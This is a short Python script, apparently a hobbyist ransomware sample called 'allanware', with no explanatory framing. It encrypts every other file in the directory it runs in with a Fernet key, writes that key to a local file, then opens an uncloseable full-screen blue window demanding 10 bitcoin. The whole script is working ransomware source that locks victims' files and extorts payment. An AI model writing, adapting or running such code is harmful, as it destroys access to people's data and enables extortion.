#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
#let's hack with allan
import tkinter as tk

def fake_blue_screen():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(background='blue')

    label = tk.Label(root, text="Allan has hacked your syste, give me 10 bitcoin.", fg="white", bg="blue", font=("Helvetica", 16))
    label.pack(expand=True)

    # Disable the ability to close the window
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # Infinite loop to keep the window open
    root.mainloop()

files =[]

for file in os.listdir():
	if file == "allanware.py" or file =="thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

fake_blue_screen()